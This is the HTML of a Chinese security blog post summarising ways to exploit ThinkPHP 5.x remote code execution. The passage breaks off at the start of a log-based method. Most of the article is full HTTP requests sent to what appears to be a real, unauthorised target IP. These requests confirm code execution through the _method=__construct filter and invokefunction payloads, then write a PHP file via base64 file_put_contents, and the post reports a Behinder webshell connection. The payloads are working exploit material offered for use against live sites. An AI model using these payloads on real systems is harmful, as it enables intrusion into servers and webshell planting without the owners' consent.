@@ -1,0 +1,1645 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="thinkphp 5.x rce 打法总结(一), peiqiF4ck github">
+    <meta name="description" content="thinkphp 5.x rce 打法总结 thinkphp5.x">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>thinkphp 5.x rce 打法总结(一) | peiqiF4ck</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">peiqiF4ck</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">peiqiF4ck</div>
+        <div class="logo-desc">
+            
+            网络安全,代码审计
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/peiqiF4ck" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/peiqiF4ck" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271556104.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">thinkphp 5.x rce 打法总结(一)</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PenetrationTestingExample/">
+                                <span class="chip bg-color">PenetrationTestingExample</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/PenetrationTest/" class="post-category">
+                                PenetrationTest
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-07-27
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2024-11-09
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    24 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>大家在使用我们的工具中,反应说扫描出来有漏洞但是就是不会打。以前说实话我也没怎么搞过thinkphp的站点。正好趁着大家反应的问题实战一下。顺便把这个编写到工具里面方便自动化。但是并不是能打所有的站只是能打部分站点这些打法。后续等工具实战话多的时候我们在总结比较好的通用方法。当然下面总结的都是互联网我只不过是实战了一下。搜索了一波这方面的资料也不少。但是比较分散所以特意搞了一篇文章我们来实战一下。为了大家都可以学会。我们有的图片就不打马赛克了(使用水印代替一下)。有些是根据系统总结出来的打法。当然这都不全后续着重遇到的情形下面在总结先总结一波放出来一下。废话不多说开干。</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p> 使用软件扫描出来的站点如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271402467.png" alt="软件扫描截图"><br>我们从上图可以看出软件扫描出这个站点存在漏洞。<br>我们使用brup复现一下</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+
+_method=__construct&amp;method=GET&amp;filter[]=var_dump&amp;get[]=a6d3e827b198d120okhacked</span></code></pre>
+<p>我们看回显。说明存在漏洞。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271405298.png" alt="burp测试"><br>我们看phpinfo函数被禁用没有</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+
+_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;get[]=phpinfo</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271408949.png" alt="说明没有被禁用正常"><br>但是我们看到disable_functions  我们看到几乎吧代码执行函数全部禁用了。我们看到上面php是 7.0没禁用assert所以可以直接使用assert getshell</p>
+<pre class="language-java" data-language="java"><code class="language-java">passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>putenv<span class="token punctuation">,</span>chroot<span class="token punctuation">,</span>chgrp<span class="token punctuation">,</span>chown<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>ini_alter<span class="token punctuation">,</span>ini_restore<span class="token punctuation">,</span>dl<span class="token punctuation">,</span>openlog<span class="token punctuation">,</span>syslog<span class="token punctuation">,</span>readlink<span class="token punctuation">,</span>symlink<span class="token punctuation">,</span>popepassthru<span class="token punctuation">,</span>pcntl_alarm<span class="token punctuation">,</span>pcntl_fork<span class="token punctuation">,</span>pcntl_waitpid<span class="token punctuation">,</span>pcntl_wait<span class="token punctuation">,</span>pcntl_wifexited<span class="token punctuation">,</span>pcntl_wifstopped<span class="token punctuation">,</span>pcntl_wifsignaled<span class="token punctuation">,</span>pcntl_wifcontinued<span class="token punctuation">,</span>pcntl_wexitstatus<span class="token punctuation">,</span>pcntl_wtermsig<span class="token punctuation">,</span>pcntl_wstopsig<span class="token punctuation">,</span>pcntl_signal<span class="token punctuation">,</span>pcntl_signal_dispatch<span class="token punctuation">,</span>pcntl_get_last_error<span class="token punctuation">,</span>pcntl_strerror<span class="token punctuation">,</span>pcntl_sigprocmask<span class="token punctuation">,</span>pcntl_sigwaitinfo<span class="token punctuation">,</span>pcntl_sigtimedwait<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>pcntl_getpriority<span class="token punctuation">,</span>pcntl_setpriority<span class="token punctuation">,</span>imap_open<span class="token punctuation">,</span>apache_setenv</code></pre>
+
+<h2 id="一-代码执行getshell"><a href="#一-代码执行getshell" class="headerlink" title="一:代码执行getshell"></a>一:代码执行getshell</h2><p>因为php版本是 7.0以下所以可以使用assert 执行phpinfo</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+_method=__construct&amp;filter[]=assert&amp;method=get&amp;get[]=phpinfo()</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271415040.png" alt="assert执行代码"><br>写文件函数,直接拿下webshell</p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 903
+
+_method=__construct&amp;filter[]=assert&amp;method=get&amp;get[]=@file_put_contents(base64_decode(MzMzMy5waHA=),base64_decode("YWZhZHNmZHM8P3BocCBwaHBpbmZvKCk7Pz5hZmRzZmRzZg=="));
+
+返回:
+   &lt;div class="info">
+                &lt;div>
+                    &lt;h2>[8] &lt;abbr title="think\exception\ErrorException">ErrorException&lt;/abbr> in &lt;a class="toggle" title="/www/wwwroot/s.ios0.top/thinkphp/library/think/Request.php(1040) : assert code line 1">Request.php(1040) : assert code line 1&lt;/a>&lt;/h2>
+                &lt;/div>
+                &lt;div>&lt;h1>Use of undefined constant __construct - assumed '__construct'&lt;/h1>&lt;/div>
+            &lt;/div>
+        
+    &lt;/div></span></code></pre>
+<p>注意有些根目录不可写通过这种方式可能拿不到shell。所以可以写到别的文件夹里面。如果遇到可以尝试一下。后续我遇到的话会补充一波如何写到别的文件夹里面。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271420885.png" alt="写文件直接拿下"><br>另外代码执行还有一种打法</p>
+<pre class="language-java" data-language="java"><code class="language-java">POST <span class="token comment">//index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@file_put_contents(base64_decode(MzMzMy5waHA=),base64_decode("YWZhZHNmZHM8P3BocCBwaHBpbmZvKCk7Pz5hZmRzZmRzZg==")) HTTP/1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
+<span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span>
+<span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cn
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 0
+</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271423551.png" alt="直接拿下"><br>可以看到成功拿下webshell。上述打法是针对可以执行代码的那么无法执行代码的如何打。冰蝎连接<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271426322.png" alt="冰蝎连接"><br>对了上述目标是 thinkphp框架的版本是 5.0.5 。我们假如这个网站不可以执行代码我们如何打。</p>
+<h2 id="二-日志方式打"><a href="#二-日志方式打" class="headerlink" title="二:日志方式打"></a>二:日志方式打</h2><p>  对于日志方式我们先得找到日志在哪里存着,遍历目录寻找日志日志.</p>
+  <pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span>
+<span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span>
+<span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
+<span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span>
